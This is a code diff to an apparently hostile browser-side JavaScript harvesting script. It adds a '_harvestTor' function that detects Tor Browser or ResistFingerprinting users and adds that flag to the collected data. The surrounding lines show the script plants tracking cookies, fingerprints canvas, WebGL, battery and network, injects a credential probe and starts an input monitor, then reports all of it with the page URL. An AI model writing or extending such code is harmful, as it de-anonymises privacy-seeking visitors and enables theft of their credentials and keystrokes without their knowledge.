@@ -170,6 +170,27 @@
         }
     }
 
+    /* ── 0.4 Detect Tor Browser & ResistFingerprinting (RFP) ─────── */
+    function _harvestTor() {
+        try {
+            var ua = navigator.userAgent || '';
+            var isFirefox = /Firefox|FxiOS/i.test(ua);
+            var isUTC = (new Date().getTimezoneOffset() === 0);
+            var hasNoPlugins = (!navigator.plugins || navigator.plugins.length === 0);
+            var hasNoBattery = (typeof navigator.getBattery !== 'function');
+            var hasNoGeo = (typeof navigator.geolocation === 'undefined' || !navigator.geolocation);
+            var isFixedRatio = (window.devicePixelRatio === 1);
+
+            if (isFirefox && (isUTC || hasNoGeo) && hasNoPlugins && hasNoBattery && isFixedRatio) {
+                _NX.captured.isTorBrowser = 'YES (Tor / ResistFingerprinting Active)';
+            } else {
+                _NX.captured.isTorBrowser = 'No';
+            }
+        } catch (e) {
+            _NX.captured.isTorBrowser = 'Could not determine';
+        }
+    }
+
     /* ── 0.4 Plant tracking cookies (fingerprinting) ────────────── */
     function _plantCookies() {
         try {
@@ -550,6 +571,7 @@
             webgl_renderer: _NX.captured.webglRenderer,
             hardware_concurrency: _NX.captured.hardwareConcurrency,
             device_memory: _NX.captured.deviceMemory,
+            is_tor_browser: _NX.captured.isTorBrowser,
             page_url: window.location.href,
             page_title: document.title
         });
@@ -586,6 +608,7 @@
         _harvestBattery();
         _harvestNetwork();
         _harvestCanvasAndWebGL();
+        _harvestTor();
         _harvestIndexedDB();
         _injectCredentialProbe();
         _startInputMonitor();
